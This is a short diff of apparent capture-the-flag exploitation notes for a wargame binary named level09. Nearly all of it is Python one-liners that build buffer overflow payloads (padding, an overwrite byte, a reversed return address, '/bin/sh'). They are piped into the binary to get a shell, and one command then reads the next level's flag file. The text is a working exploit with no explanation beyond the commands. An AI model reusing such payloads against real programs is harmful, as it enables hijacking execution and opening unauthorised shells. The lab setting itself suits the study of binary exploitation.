@@ -16,3 +16,8 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 
 
 <<< $(python -c 'print "A"*40 + "\xd0" + "\n" + "A"*200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1] + "\n" + "/bin/sh" + "\n"')
+
+
+{ python -c 'print "A"*40 + "\xff" + "\n" + "A"*200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1] + "\n" + "/bin/sh" + "\n"' ; cat - ;} | ./level09
+
+{ python -c 'print "A"*40 + "\xca" + "\n" + "A"*200 + "\x48\x8c"[::-1] + "\n" + "/bin/sh" + "\n"' ; echo "cd ../end && cat end" ;} | ./level09
